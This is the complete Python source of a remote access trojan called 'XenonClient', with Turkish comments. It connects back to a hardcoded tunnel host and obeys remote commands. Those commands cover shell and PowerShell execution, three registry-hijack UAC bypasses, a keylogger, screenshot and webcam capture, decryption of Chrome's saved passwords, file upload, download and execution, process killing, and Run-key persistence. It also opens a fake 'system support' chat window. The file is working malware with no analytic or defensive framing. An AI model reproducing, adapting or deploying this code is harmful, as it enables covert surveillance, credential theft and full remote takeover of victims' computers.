import socket
import threading
import subprocess
import os
import platform
import json
import webbrowser
import time
import tkinter as tk
from tkinter import messagebox, scrolledtext
import winreg
import base64
import tempfile
import urllib.request
import math
import queue
import ssl
import sys
import ctypes
import struct
from PIL import ImageGrab
import cv2
import psutil
import sqlite3
import win32crypt  # pycryptodome
from Crypto.Cipher import AES
import shutil

# --- BAĞLANTI AYARLARI ---
HOST = "uwtd3ffva.localto.net"
PORT = 6096
USE_SSL = True
SSL_CERT = None  # None ise sertifika doğrulaması yapma (test için)
# -------------------------

class XenonClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = None
        self.ssl_sock = None
        self.chat_win = None
        self.chat_box = None
        self.chat_running = False
        self.keylogger_running = False
        self.keylog_data = ""
        self.running = True
        
        # Ses için pygame mixer
        self.mixer_initialized = False
        self.audio_queue = queue.Queue()
        self.audio_thread_running = True
        threading.Thread(target=self.audio_worker, daemon=True).start()
        
        # Keylogger thread'i
        self.keylog_thread = None

    # ---------- SES (pygame) ----------
    def audio_worker(self):
        try:
            import pygame
            pygame.mixer.init()
            self.mixer_initialized = True
            while self.audio_thread_running:
                try:
                    cmd = self.audio_queue.get(timeout=0.5)
                    if cmd[0] == "play":
                        filepath = cmd[1]
                        pygame.mixer.music.load(filepath)
                        pygame.mixer.music.play()
                    elif cmd[0] == "pause":
                        pygame.mixer.music.pause()
                    elif cmd[0] == "resume":
                        pygame.mixer.music.unpause()
                    elif cmd[0] == "stop":
                        pygame.mixer.music.stop()
                    elif cmd[0] == "volume":
                        vol = cmd[1] / 100.0
                        pygame.mixer.music.set_volume(vol)
                except queue.Empty:
                    pass
                except Exception as e:
                    print(f"Ses hatası: {e}")
        except ImportError:
            print("pygame yüklü değil, ses özellikleri devre dışı.")

    # ---------- SİSTEM BİLGİSİ ----------
    def get_sys_info(self):
        try:
            with urllib.request.urlopen('https://api.ipify.org', timeout=5) as resp:
                public_ip = resp.read().decode('utf-8')
        except:
            public_ip = "Unknown"
        
        try:
            with urllib.request.urlopen('https://ipapi.co/country/', timeout=5) as resp:
                country = resp.read().decode('utf-8').strip()
        except:
            country = "TR"
        
        return {
            "id": f"{os.getlogin()}@{platform.node()}",
            "ip": public_ip,
            "country": country,
            "os": f"{platform.system()} {platform.release()}"
        }

    # ---------- YENİ PROTOKOL (JSON + Uzunluk) ----------
    def send_json(self, data):
        msg = json.dumps(data).encode('utf-8')
        length = len(msg).to_bytes(4, byteorder='big')
        try:
            if self.ssl_sock:
                self.ssl_sock.send(length + msg)
            else:
                self.sock.send(length + msg)
        except Exception as e:
            print(f"Gönderme hatası: {e}")
            raise

    def recv_json(self):
        try:
            raw_len = self.ssl_sock.recv(4) if self.ssl_sock else self.sock.recv(4)
            if not raw_len:
                return None
            msg_len = int.from_bytes(raw_len, byteorder='big')
            chunks = []
            while msg_len > 0:
                chunk = self.ssl_sock.recv(min(4096, msg_len)) if self.ssl_sock else self.sock.recv(min(4096, msg_len))
                if not chunk:
                    break
                chunks.append(chunk)
                msg_len -= len(chunk)
            return json.loads(b''.join(chunks).decode('utf-8'))
        except:
            return None

    # ---------- BAĞLANTI ----------
    def connect(self):
        while self.running:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if USE_SSL:
                    context = ssl.create_default_context()
                    if SSL_CERT is None:
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                    self.ssl_sock = context.wrap_socket(self.sock, server_hostname=self.host)
                    self.ssl_sock.connect((self.host, self.port))
                else:
                    self.sock.connect((self.host, self.port))
                    self.ssl_sock = None

                # Bağlanır bilgi gönder
                self.send_json({"cmd": "init", "info": self.get_sys_info()})
                self.listen()
            except Exception as e:
                print(f"Bağlantı hatası: {e}, 5 sn sonra yeniden deneniyor...")
                time.sleep(5)

    def listen(self):
        while self.running:
            try:
                data = self.recv_json()
                if data is None:
                    break
                self.process_message(data)
            except Exception as e:
                print(f"Listen hatası: {e}")
                break
        self.close_connection()

    def close_connection(self):
        if self.ssl_sock:
            self.ssl_sock.close()
        elif self.sock:
            self.sock.close()
        self.ssl_sock = None
        self.sock = None

    # ---------- MESAJ İŞLEME ----------
    def process_message(self, data):
        cmd = data.get("cmd")
        if not cmd:
            return

        # ----- MESAJ KUTUSU -----
        if cmd == "msg":
            threading.Thread(target=lambda: messagebox.showinfo("Duyuru", data["text"])).start()

        # ----- SOHBET -----
        elif cmd == "chat_open":
            if not self.chat_running:
                threading.Thread(target=self.gui_chat, daemon=True).start()

        elif cmd == "chat_msg":
            if self.chat_box:
                try:
                    self.chat_box.config(state="normal")
                    self.chat_box.insert(tk.END, f"DESTEK: {data['text']}\n")
                    self.chat_box.config(state="disabled")
                    self.chat_box.see(tk.END)
                except:
                    pass

        elif cmd == "chat_close":
            if self.chat_win:
                self.chat_running = False
                try:
                    self.chat_win.quit()
                except:
                    pass

        # ----- BEEP -----
        elif cmd == "beep":
            if platform.system() == "Windows":
                import winsound
                winsound.Beep(800, 500)

        # ----- URL AÇ -----
        elif cmd == "open_url":
            webbrowser.open(data["url"])

        # ----- SHELL -----
        elif cmd == "shell":
            self.run_cmd(data["command"], data.get("shell_type", "cmd"))

        # ----- UAC BYPASS (gelişmiş) -----
        elif cmd == "elevate":
            target = data.get("target", "cmd")
            self.uac_bypass_advanced(target)

        # ----- SES -----
        elif cmd == "audio_upload":
            self.handle_audio_upload(data)

        elif cmd == "audio_play":
            self.audio_queue.put(("play", data["filename"]))

        elif cmd == "audio_pause":
            self.audio_queue.put(("pause",))

        elif cmd == "audio_resume":
            self.audio_queue.put(("resume",))

        elif cmd == "audio_stop":
            self.audio_queue.put(("stop",))

        elif cmd == "audio_volume":
            self.audio_queue.put(("volume", data["volume"]))

        # ----- DOSYA YÖNETİCİSİ -----
        elif cmd == "file_list":
            threading.Thread(target=self.handle_file_list, args=(data["path"],), daemon=True).start()

        elif cmd == "file_download":
            threading.Thread(target=self.handle_file_download, args=(data["path"],), daemon=True).start()

        elif cmd == "file_upload":
            threading.Thread(target=self.handle_file_upload, args=(data["path"], data["data"]), daemon=True).start()

        elif cmd == "file_delete":
            threading.Thread(target=self.handle_file_delete, args=(data["path"],), daemon=True).start()

        elif cmd == "file_execute":
            threading.Thread(target=self.handle_file_execute, args=(data["path"],), daemon=True).start()

        elif cmd == "file_edit_get":
            threading.Thread(target=self.handle_file_edit_get, args=(data["path"],), daemon=True).start()

        elif cmd == "file_edit_save":
            threading.Thread(target=self.handle_file_edit_save, args=(data["path"], data["content"]), daemon=True).start()

        elif cmd == "file_mkdir":
            threading.Thread(target=self.handle_file_mkdir, args=(data["path"],), daemon=True).start()

        elif cmd == "file_touch":
            threading.Thread(target=self.handle_file_touch, args=(data["path"],), daemon=True).start()

        elif cmd == "file_rename":
            threading.Thread(target=self.handle_file_rename, args=(data["old"], data["new"]), daemon=True).start()

        # ----- YENİ ÖZELLİKLER -----
        elif cmd == "keylog_start":
            self.start_keylogger()

        elif cmd == "keylog_stop":
            self.stop_keylogger()

        elif cmd == "keylog_get":
            self.send_json({"cmd": "keylog_data", "data": self.keylog_data})

        elif cmd == "screenshot":
            threading.Thread(target=self.take_screenshot, daemon=True).start()

        elif cmd == "webcam":
            threading.Thread(target=self.take_webcam, daemon=True).start()

        elif cmd == "process_list":
            threading.Thread(target=self.get_process_list, daemon=True).start()

        elif cmd == "process_kill":
            threading.Thread(target=self.kill_process, args=(data["pid"],), daemon=True).start()

        elif cmd == "passwords":
            threading.Thread(target=self.get_passwords, daemon=True).start()

        elif cmd == "persistence":
            self.add_persistence()

        elif cmd == "remove_persistence":
            self.remove_persistence()

        # ----- DİĞER -----
        elif cmd == "ping":
            self.send_json({"cmd": "pong"})

        elif cmd == "exit":
            self.running = False
            self.close_connection()
            sys.exit(0)

    # ---------- UAC BYPASS (GELİŞMİŞ) ----------
    def uac_bypass_advanced(self, target="cmd"):
        methods = [
            self.uac_fodhelper,
            self.uac_eventvwr,
            self.uac_computerdefaults
        ]
        for method in methods:
            if method(target):
                break

    def uac_fodhelper(self, target):
        try:
            path = r"Software\Classes\ms-settings\Shell\Open\command"
            winreg.CreateKey(winreg.HKEY_CURRENT_USER, path)
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, target)
                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            subprocess.Popen("fodhelper.exe", shell=True)
            time.sleep(2)
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, path)
            return True
        except:
            return False

    def uac_eventvwr(self, target):
        try:
            path = r"Software\Classes\mscfile\shell\open\command"
            winreg.CreateKey(winreg.HKEY_CURRENT_USER, path)
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, target)
            subprocess.Popen("eventvwr.exe", shell=True)
            time.sleep(2)
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, path)
            return True
        except:
            return False

    def uac_computerdefaults(self, target):
        try:
            path = r"Software\Classes\ComputerDefaults\shell\open\command"
            winreg.CreateKey(winreg.HKEY_CURRENT_USER, path)
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, target)
                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            subprocess.Popen("computerdefaults.exe", shell=True)
            time.sleep(2)
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, path)
            return True
        except:
            return False

    # ---------- KEYLOGGER ----------
    def start_keylogger(self):
        if self.keylogger_running:
            return
        self.keylogger_running = True
        self.keylog_data = ""
        self.keylog_thread = threading.Thread(target=self.keylog_worker, daemon=True)
        self.keylog_thread.start()

    def stop_keylogger(self):
        self.keylogger_running = False

    def keylog_worker(self):
        try:
            from pynput import keyboard
        except ImportError:
            self.keylog_data = "pynput yüklü değil."
            return

        def on_press(key):
            if not self.keylogger_running:
                return False
            try:
                if hasattr(key, 'char') and key.char:
                    self.keylog_data += key.char
                else:
                    self.keylog_data += f" [{key}] "
            except:
                pass

        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()

    # ---------- EKRAN GÖRÜNTÜSÜ ----------
    def take_screenshot(self):
        try:
            im = ImageGrab.grab()
            temp = tempfile.NamedTemporaryFile(delete=False, suffix=".png")
            im.save(temp.name)
            with open(temp.name, "rb") as f:
                data = f.read()
            os.unlink(temp.name)
            encoded = base64.b64encode(data).decode('utf-8')
            self.send_json({"cmd": "screenshot_res", "data": encoded})
        except Exception as e:
            self.send_json({"cmd": "screenshot_res", "error": str(e)})

    # ---------- WEBCAM ----------
    def take_webcam(self):
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cap.release()
            if ret:
                _, buffer = cv2.imencode('.jpg', frame)
                encoded = base64.b64encode(buffer).decode('utf-8')
                self.send_json({"cmd": "webcam_res", "data": encoded})
            else:
                self.send_json({"cmd": "webcam_res", "error": "Kamera açılamadı"})
        except Exception as e:
            self.send_json({"cmd": "webcam_res", "error": str(e)})

    # ---------- İŞLEM LİSTELEME / ÖLDÜRME ----------
    def get_process_list(self):
        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
                try:
                    pinfo = proc.info
                    processes.append({
                        "pid": pinfo['pid'],
                        "name": pinfo['name'],
                        "cpu": pinfo['cpu_percent'],
                        "mem": pinfo['memory_percent']
                    })
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
            self.send_json({"cmd": "process_list_res", "processes": processes})
        except Exception as e:
            self.send_json({"cmd": "process_list_res", "error": str(e)})

    def kill_process(self, pid):
        try:
            proc = psutil.Process(pid)
            proc.terminate()
            self.send_json({"cmd": "process_kill_res", "pid": pid, "success": True})
        except Exception as e:
            self.send_json({"cmd": "process_kill_res", "pid": pid, "error": str(e)})

    # ---------- PAROLA KURTARMA (Chrome) ----------
    def get_passwords(self):
        try:
            # Chrome login data yolu
            path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
            if not os.path.exists(path):
                self.send_json({"cmd": "passwords_res", "error": "Chrome Login Data bulunamadı"})
                return

            # Veritabanını geçici kopyala (kilitli olabilir)
            temp_file = os.path.join(tempfile.gettempdir(), "chrome_login_data")
            shutil.copy2(path, temp_file)

            conn = sqlite3.connect(temp_file)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            results = []
            for row in cursor.fetchall():
                url = row[0]
                username = row[1]
                encrypted_pw = row[2]
                # Windows DPAPI ile şifre çözme
                try:
                    password = win32crypt.CryptUnprotectData(encrypted_pw, None, None, None, 0)[1].decode('utf-8')
                except:
                    password = "<çözülemedi>"
                results.append({"url": url, "username": username, "password": password})
            cursor.close()
            conn.close()
            os.unlink(temp_file)
            self.send_json({"cmd": "passwords_res", "passwords": results})
        except Exception as e:
            self.send_json({"cmd": "passwords_res", "error": str(e)})

    # ---------- KALICILIK ----------
    def add_persistence(self):
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, "XenonClient", 0, winreg.REG_SZ, sys.executable + " " + os.path.abspath(__file__))
            self.send_json({"cmd": "persistence_res", "status": "added"})
        except Exception as e:
            self.send_json({"cmd": "persistence_res", "error": str(e)})

    def remove_persistence(self):
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.DeleteValue(regkey, "XenonClient")
            self.send_json({"cmd": "persistence_res", "status": "removed"})
        except Exception as e:
            self.send_json({"cmd": "persistence_res", "error": str(e)})

    # ---------- SHELL KOMUT ÇALIŞTIRMA ----------
    def run_cmd(self, command, mode):
        def task():
            try:
                final_cmd = command
                if mode == "powershell":
                    final_cmd = f"powershell -ExecutionPolicy Bypass -Command {command}"
                proc = subprocess.Popen(final_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                stdout, stderr = proc.communicate()
                res = (stdout + stderr).decode("cp857", errors="replace")
                if not res.strip():
                    res = "Komut çalıştırıldı (Çıktı yok)."
                self.send_json({"cmd": "shell_res", "output": res})
            except Exception as e:
                self.send_json({"cmd": "shell_res", "output": f"Hata: {str(e)}"})
        threading.Thread(target=task, daemon=True).start()

    # ---------- DOSYA YÖNETİCİSİ İŞLEMLERİ ----------
    def handle_file_list(self, path):
        try:
            items = []
            with os.scandir(path) as entries:
                for entry in entries:
                    is_dir = entry.is_dir()
                    size = entry.stat().st_size if not is_dir else 0
                    modified = entry.stat().st_mtime
                    items.append({
                        "name": entry.name,
                        "is_dir": is_dir,
                        "size": size,
                        "modified": modified
                    })
            self.send_json({"cmd": "file_res", "subcmd": "list", "path": path, "items": items})
        except Exception as e:
            self.send_json({"cmd": "file_res", "subcmd": "list", "path": path, "error": str(e)})

    def handle_file_download(self, path):
        try:
            with open(path, "rb") as f:
                data = f.read()
            encoded = base64.b64encode(data).decode('utf-8')
            self.send_json({"cmd": "file_res", "subcmd": "download", "path": path, "data": encoded})
        except Exception as e:
            self.send_json({"cmd": "file_res", "subcmd": "download", "path": path, "error": str(e)})

    def handle_file_upload(self, path, encoded):
        try:
            data = base64.b64decode(encoded)
            with open(path, "wb") as f:
                f.write(data)
            self.send_json({"cmd": "file_res", "subcmd": "upload", "path": path, "success": True})
        except Exception as e:
            self.send_json({"cmd": "file_res", "subcmd": "upload", "path": path, "error": str(e)})

    def handle_file_delete(self, path):
        try:
            if os.path.isdir(path):
                os.rmdir(path)
            else:
                os.remove(path)
            self.send_json({"cmd": "file_res", "subcmd": "delete", "path": path, "success": True})
        except Exception as e:
            self.send_json({"cmd": "file_res", "subcmd": "delete", "path": path, "error": str(e)})

    def handle_file_execute(self, path):
        try:
            if platform.system() == "Windows":
                os.startfile(path)
            else:
                subprocess.Popen([path])
            self.send_json({"cmd": "file_res", "subcmd": "execute", "path": path, "success": True})
        except Exception as e:
            self.send_json({"cmd": "file_res", "subcmd": "execute", "path": path, "error": str(e)})

    def handle_file_edit_get(self, path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                content = f.read()
            self.send_json({"cmd": "file_res", "subcmd": "edit_get", "path": path, "content": content})
        except Exception as e:
            self.send_json({"cmd": "file_res", "subcmd": "edit_get", "path": path, "error": str(e)})

    def handle_file_edit_save(self, path, content):
        try:
            with open(path, "w", encoding="utf-8") as f:
                f.write(content)
            self.send_json({"cmd": "file_res", "subcmd": "edit_save", "path": path, "success": True})
        except Exception as e:
            self.send_json({"cmd": "file_res", "subcmd": "edit_save", "path": path, "error": str(e)})

    def handle_file_mkdir(self, path):
        try:
            os.makedirs(path, exist_ok=True)
            self.send_json({"cmd": "file_res", "subcmd": "mkdir", "path": path, "success": True})
        except Exception as e:
            self.send_json({"cmd": "file_res", "subcmd": "mkdir", "path": path, "error": str(e)})

    def handle_file_touch(self, path):
        try:
            with open(path, "a"):
                os.utime(path, None)
            self.send_json({"cmd": "file_res", "subcmd": "touch", "path": path, "success": True})
        except Exception as e:
            self.send_json({"cmd": "file_res", "subcmd": "touch", "path": path, "error": str(e)})

    def handle_file_rename(self, old, new):
        try:
            os.rename(old, new)
            self.send_json({"cmd": "file_res", "subcmd": "rename", "path": new, "success": True})
        except Exception as e:
            self.send_json({"cmd": "file_res", "subcmd": "rename", "old": old, "error": str(e)})

    # ---------- SES YÜKLEME (Parçalı) ----------
    def handle_audio_upload(self, data):
        filename = data["filename"]
        chunk_index = data["chunk_index"]
        total_chunks = data["total_chunks"]
        encoded = data["data"]

        temp_dir = os.path.join(tempfile.gettempdir(), "xenon_audio")
        os.makedirs(temp_dir, exist_ok=True)
        chunk_data = base64.b64decode(encoded)
        chunk_file = os.path.join(temp_dir, f"{filename}.part{chunk_index}")
        with open(chunk_file, "wb") as f:
            f.write(chunk_data)

        if chunk_index == total_chunks - 1:
            full_path = os.path.join(temp_dir, filename)
            with open(full_path, "wb") as outfile:
                for i in range(total_chunks):
                    part_file = os.path.join(temp_dir, f"{filename}.part{i}")
                    with open(part_file, "rb") as infile:
                        outfile.write(infile.read())
                    os.remove(part_file)
            self.current_audio_file = full_path
            self.send_json({"cmd": "audio_res", "status": "loaded", "filename": filename})

    # ---------- SOHBET GUI ----------
    def gui_chat(self):
        self.chat_running = True
        self.chat_win = tk.Tk()
        self.chat_win.title("Sistem Destek")
        self.chat_win.geometry("350x450")
        self.chat_win.attributes("-topmost", True)
        
        self.chat_box = scrolledtext.ScrolledText(self.chat_win, state="disabled")
        self.chat_box.pack(expand=True, fill="both", padx=5, pady=5)
        
        ent = tk.Entry(self.chat_win)
        ent.pack(fill="x", padx=5, pady=5)

        def send_srv(e=None):
            m = ent.get()
            if m:
                self.chat_box.config(state="normal")
                self.chat_box.insert(tk.END, f"Siz: {m}\n")
                self.chat_box.config(state="disabled")
                ent.delete(0, tk.END)
                try:
                    self.send_json({"cmd": "chat", "text": m})
                except:
                    pass
        
        ent.bind("<Return>", send_srv)
        
        def on_closing():
            self.chat_running = False
            self.chat_win.destroy()
            self.chat_win = None
            self.chat_box = None
            
        self.chat_win.protocol("WM_DELETE_WINDOW", on_closing)
        self.chat_win.mainloop()
        self.chat_running = False
        self.chat_win = None


if __name__ == "__main__":
    client = XenonClient(HOST, PORT)
    try:
        client.connect()
    except KeyboardInterrupt:
        client.running = False
